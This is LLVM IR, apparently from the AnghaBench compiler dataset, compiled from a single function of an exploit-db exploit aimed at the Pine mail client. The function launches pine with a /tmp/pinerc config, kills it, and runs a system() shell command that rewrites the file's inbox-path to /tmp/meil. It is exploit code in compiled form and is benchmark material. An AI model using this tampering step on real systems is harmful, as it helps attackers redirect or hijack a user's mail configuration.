; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_99.c_pinerc.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_99.c_pinerc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [7 x i8] c"fork()\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"pine\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"/tmp/pinerc\00", align 1
@__const.pinerc.arg = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i32 0, i32 0), i8* null], align 16
@PINE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"execve()\00", align 1
@SIGKILL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [109 x i8] c"grep -v inbox-path /tmp/pinerc > /tmp/o && mv /tmp/o /tmp/pinerc && echo inbox-path=/tmp/meil >> /tmp/pinerc\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"system()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @pinerc() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8*], align 16
  %3 = call i32 (...) @fork()
  store i32 %3, i32* %1, align 4
  %4 = load i32, i32* %1, align 4
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %6, label %8

6:                                                ; preds = %0
  %7 = call i32 @die(i32 1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  br label %8

8:                                                ; preds = %6, %0
  %9 = load i32, i32* %1, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %19, label %11

11:                                               ; preds = %8
  %12 = bitcast [4 x i8*]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 bitcast ([4 x i8*]* @__const.pinerc.arg to i8*), i64 32, i1 false)
  %13 = call i32 @close(i32 1)
  %14 = call i32 @close(i32 2)
  %15 = load i32, i32* @PINE, align 4
  %16 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 0
  %17 = call i32 @execve(i32 %15, i8** %16, i32* null)
  %18 = call i32 @die(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  br label %25

19:                                               ; preds = %8
  %20 = call i32 @sleep(i32 1)
  %21 = load i32, i32* %1, align 4
  %22 = load i32, i32* @SIGKILL, align 4
  %23 = call i32 @kill(i32 %21, i32 %22)
  %24 = call i32 @wait(i32* null)
  br label %25

25:                                               ; preds = %19, %11
  %26 = call i64 @system(i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.5, i64 0, i64 0))
  %27 = icmp slt i64 %26, 0
  br i1 %27, label %28, label %30

28:                                               ; preds = %25
  %29 = call i32 @die(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  br label %30

30:                                               ; preds = %28, %25
  ret void
}

declare dso_local i32 @fork(...) #1

declare dso_local i32 @die(i32, i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execve(i32, i8**, i32*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i64 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
